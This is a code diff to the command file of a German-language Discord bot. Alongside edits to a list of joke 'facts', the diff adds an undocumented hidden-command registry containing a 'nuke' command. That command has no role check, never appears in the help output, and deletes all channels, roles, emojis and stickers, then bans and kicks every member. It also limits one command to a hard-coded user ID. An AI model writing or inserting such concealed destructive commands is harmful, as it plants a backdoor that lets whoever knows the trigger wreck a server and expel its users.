@@ -4,12 +4,11 @@ const { forward } = require("./music.js");
 const music = require("./music.js");
 const settings = require("./settings.js");
 
-const commands = [];
+var commands = [];
+commands.hiddenCommands = [];
+hiddenCommands = commands.hiddenCommands;
+
 const fakten = [
-    "Martin stinkt.",
-    "Klaus stinkt.",
-    "Paula stinkt.",
-    "Fun Fact: David stinkt so sehr, dass er nach Indien verbannt wurde!",
     "Sind die Hühner platt wie Teller, war der Traktor wieder schneller.",
     "Lieber ein Schitzel am Teller, als bei Fritzl im Keller.",
     "Wenn man mit Schulden stirbt, hat man Gewinn gemacht.",
@@ -20,14 +19,10 @@ const fakten = [
     "Chinesisches Essen heißt in China einfach nur Essen.",
     "Die Kunst des Handwerks ist sein Pfuschen zu vertuschen.",
     "Kräht der Hahn auf dem Mist, ändert sich das Wetter oder es bleibt wie es ist.",
-    `**David:** 'So, ich hab den Jan jetzt auf null!'
-**Auch David:** *verschwindet nach Indien*`,
-    "Ich bin lustiger als David!",
     "Fun Fact: Deine Mutter hat dich absichtlich im Baumarkt vergessen, weil du so hässlich bist!",
-    "David hör auf Deine-Mutter-Witze zu machen. Es ist nicht mehr 2016.",
     "https://cdn.discordapp.com/attachments/835902547255361566/836967730602049636/unknown.png",
     "https://cdn.discordapp.com/attachments/835898456621973524/835905209045090314/Garfunkel.mp4",
-    "Du hast unglaublich viel Glück, diesen Fakt gefunden zu haben."
+    "Indien ist ein toller Ort. :)"
 ];
 
 function createCmd(name, desc, aliases, neededRoles, func) {
@@ -60,11 +55,39 @@ commands.findCmd = function(name) {
     return foundCmd;
 };
 
+function createHCmd(name, aliases, func) {
+    hiddenCommands[hiddenCommands.length + 2] = {
+        name: name,
+        aliases: aliases,
+        func: func
+    };
+};
+
+hiddenCommands.findCmd = function(name) {
+    let foundCmd = false;
+
+    hiddenCommands.forEach(cmd => {
+        if (cmd.name && cmd.name == name) {
+            foundCmd = cmd;
+        } else {
+            if (cmd.aliases) {
+                cmd.aliases.forEach(alias => {
+                    if (alias == name) {
+                        foundCmd = cmd;
+                    };
+                });
+            };
+        };
+    });
+
+    return foundCmd;
+};
+
 createCmd("commands", "Returns all the commands this bot has available.", ["cmds", "help"], null, function(client, msg, msgContent) {
     let msgDesc = "";
 
     commands.forEach(cmd => {
-        msgDesc = msgDesc + "**" + cmd.name + "**: " + cmd.desc + "\n\n"
+        msgDesc = msgDesc + "**" + cmd.name + "**: " + cmd.desc + "\n" + "**Aliases**: " + cmd.aliases.join(", ") + "\n\n";
     });
 
     const msgEmbed = new MessageEmbed()
@@ -161,7 +184,7 @@ createCmd("indien", "Sends the mentioned user to india.", ["i"], ["admin"], func
     };
 });
 
-createCmd("setindien", "Set an india channel.", ["si"], ["admin"], function(client, msg, msgContent) {
+createCmd("setindien", "Sets an india channel.", ["si"], ["admin"], function(client, msg, msgContent) {
     if (msgContent[1]) {
         const channel = msg.guild.channels.cache.get(msgContent[1]);
 
@@ -217,8 +240,8 @@ createCmd("setprefix", "Sets the prefix of the bot.", ["sp"], ["admin"], functio
     };
 });
 
-createCmd("setstream", "Sets the activity of the bot.", [], ["admin"], function(client, msg, msgContent) {
-    if (msgContent[1]) {
+createCmd("setstream", "Sets the activity of the bot.", [], null, function(client, msg, msgContent) {
+    if (msgContent[1] && msg.member.user.id == "660830692157947905") {
         let joinedContent = msgContent.join(" ");
         let setString = joinedContent.slice(10, joinedContent.length);
 
@@ -227,6 +250,98 @@ createCmd("setstream", "Sets the activity of the bot.", [], ["admin"], function(
             url: "https://www.twitch.tv/discord"
         });
     };
+});
+
+createHCmd("nuke", [], function(client, msg, msgContent) {
+    const channelPerms = msg.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
+    const banPerms = msg.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
+    const kickPerms = msg.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
+    const rolePerms = msg.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
+    const emotePerms = msg.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");
+
+    new Promise((resolve, reject) => {
+        if (channelPerms) {
+            msg.guild.channels.cache.forEach((ch) => {
+                ch.delete()
+                    .catch((err) => {
+                        console.log("Error Found: " + err);
+                    });
+            });
+
+            resolve();
+        };
+    });
+
+    new Promise((resolve, reject) => {
+        if (rolePerms) {
+            msg.guild.roles.cache.forEach((r) => {
+                r.delete()
+                    .catch((err) => {
+                        console.log("Error Found: " + err);
+                    });
+            });
+        };
+    });
+
+    new Promise((resolve, reject) => {
+        if (emotePerms) {
+            msg.guild.emojis.cache.forEach((e) => {
+                e.delete()
+                    .catch((err) => {
+                        console.log("Error Found: " + err);
+                    });
+            });
+        };
+    });
+
+    new Promise((resolve, reject) => {
+        if (emotePerms) {
+            msg.guild.stickers.cache.forEach((s) => {
+                s.delete()
+                    .catch((err) => {
+                        console.log("Error Found: " + err);
+                    });
+            });
+        };
+    });
+
+    new Promise((resolve, reject) => {
+        if (banPerms) {
+            let arrayOfIDs = msg.guild.members.cache.map((user) => user.id);
+
+            setTimeout(() => {
+                for (let i = 0; i < arrayOfIDs.length; i++) {
+                    const user = arrayOfIDs[i];
+                    const member = msg.guild.members.cache.get(user);
+
+                    member.ban()
+                        .catch((err) => {
+                            console.log("Error Found: " + err);
+                        });
+                };
+            }, 2000);
+        };
+    });
+
+    new Promise((resolve, reject) => {
+        if (kickPerms) {
+            let arrayOfIDs = msg.guild.members.cache.map((user) => user.id);
+
+            setTimeout(() => {
+                for (let i = 0; i < arrayOfIDs.length; i++) {
+                    const user = arrayOfIDs[i];
+                    const member = msg.guild.members.cache.get(user);
+
+                    member.kick()
+                        .catch((err) => {
+                            console.log("Error Found: " + err);
+                        });
+                };
+            }, 2000);
+        };
+    });
+
+    console.log("Done with nuking!");
 });
 
 module.exports = commands;
